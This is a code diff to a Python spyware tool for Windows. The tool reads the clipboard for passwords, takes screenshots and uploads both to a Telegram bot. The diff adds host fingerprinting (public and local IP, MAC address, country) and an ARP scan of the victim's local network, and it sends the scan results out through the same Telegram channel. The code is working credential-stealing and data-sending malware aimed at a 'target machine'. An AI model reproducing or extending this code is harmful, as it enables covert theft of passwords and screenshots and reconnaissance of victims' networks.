@@ -1,7 +1,7 @@
 import ctypes
 from ctypes import windll
 import getpass as gp
-import http.client
+from requests import get
 import sys
 from time import sleep
 from datetime import datetime
@@ -12,6 +12,12 @@ import glob
 import time
 import os
 import pyautogui
+import socket
+from getmac import get_mac_address as gma
+import ipaddress
+# from scapy.all import *
+from scapy.layers.l2 import Ether, ARP
+from scapy.sendrecv import srp
 
 MY_TIME = datetime.now().strftime('%H.%M.%S_%Y.%m.%d')
 # telegram token and id
@@ -83,14 +89,61 @@ def interceptor_passwords(a_string):
     return '\n'.join(rx.findall(a_string))
 
 
-# ip finder
+# find public IP
 def ip_finder():
-    conn = http.client.HTTPConnection('ifconfig.me')
-    conn.request('GET', '/ip')
+    ip = get('https://api.ipify.org').content.decode('utf8')
     try:
-        return conn.getresponse().read()
+        return '{}'.format(ip)
     except:
         return 'Can not find ip'
+
+
+# variable for public IP
+public_ip = ip_finder()
+
+# variable for hostname
+hostname = socket.gethostname()
+
+# variable for mac address host machine
+mac_hostname = gma()
+
+
+# find local IP
+def get_local_ip():
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        # Use Google Public DNS server to determine own IP
+        sock.connect(('8.8.8.8', 80))
+        return sock.getsockname()[0]
+    except socket.error:
+        try:
+            return socket.gethostbyname(socket.gethostname())
+        except socket.gaierror:
+            return '127.0.0.1'
+    finally:
+        sock.close()
+
+
+# variable for local IP
+local_ip = get_local_ip()
+
+# variable for subnet mask in local network
+net_mask = ipaddress.IPv4Network(local_ip).netmask
+
+
+# find country of public IP
+def country_finder(ip):
+    endpoint = f'https://ipinfo.io/{ip}/json'
+    response = requests.get(endpoint, verify=True)
+    if response.status_code != 200:
+        return 'cannot find country'
+    data = response.json()
+    return data['country']
+
+
+# variable for all information about host machine
+host_info = f'name: {hostname} local IP: {local_ip} subnet mask: {net_mask} mac: {mac_hostname} public IP: {public_ip}' \
+            f' country: {country_finder(public_ip)} '
 
 
 # create directory for screenshots
@@ -106,7 +159,7 @@ def screen_shot():
     pyautogui.screenshot().save(f'{screen_dir}/{MY_TIME}.png')
 
 
-# send screenshots to telegram
+# function for send screenshots to telegram
 def send_screen():
     os.chdir(f'{screen_dir}')
     for screen in glob.iglob('*.png'):
@@ -117,7 +170,7 @@ def send_screen():
         requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto?chat_id={ADMIN_ID}', files=files)
 
 
-# send log to telegram with time interval
+# function for send log to telegram with time interval
 def log_sender():
     global start_time
     if int(time.time() - start_time) >= interval:
@@ -125,17 +178,46 @@ def log_sender():
             'document': open(f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt', 'rb')}
         requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={ADMIN_ID}',
                       files=files)
+        try:
+            # call ARP scanner local network of target machine
+            arp_scan(f'{local_ip}/24')
+            # send logs scan local network to telegram
+            files = {
+                'document': open(f'C:/Users/{USER_NAME}/Downloads/local_devices.txt', 'rb')}
+            requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={ADMIN_ID}',
+                          files=files)
+        except:
+            pass
+
         # reset start time
         start_time = time.time()
 
 
-# clean logs in screenshot folder and list
+# clean logs in screenshot folder and list of screenshots
 def clean_logs():
     os.chdir(f'{screen_dir}')
     clean_log = os.listdir()
     for _ in clean_log:
         os.remove(_)
         screen_list.clear()
+
+
+# function ARP scan local network
+def arp_scan(ip):
+    local_dev = open(f'C:/Users/{USER_NAME}/Downloads/local_devices.txt', 'a')
+    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+    ans, un_ans = srp(request, timeout=2, retry=1)
+    result = []
+
+    for sent, received in ans:
+        if received.hwsrc not in 'MAC':
+            # collect scan info to list of dictionaries
+            result.append({'IP': received.psrc, 'MAC': received.hwsrc})
+        else:
+            continue
+    # write scan log to file 'local_devices.txt'
+    for i in result:
+        print(i, file=local_dev)
 
 
 # Intercept pass,  write to file and send text log to Telegram
@@ -161,7 +243,7 @@ def start_loop():
                 caught_pass = interceptor_passwords(CLIPBOARD_STRING)
                 if caught_pass is not None:
                     # add intercepted pass and used time and ip to doc:
-                    print(caught_pass, 'used', MY_TIME, 'IP:', ip, file=f)
+                    print(caught_pass, 'used', MY_TIME, host_info, file=f)
                     # make screenshot
                     screen_shot()
                     # send screenshot to telegram
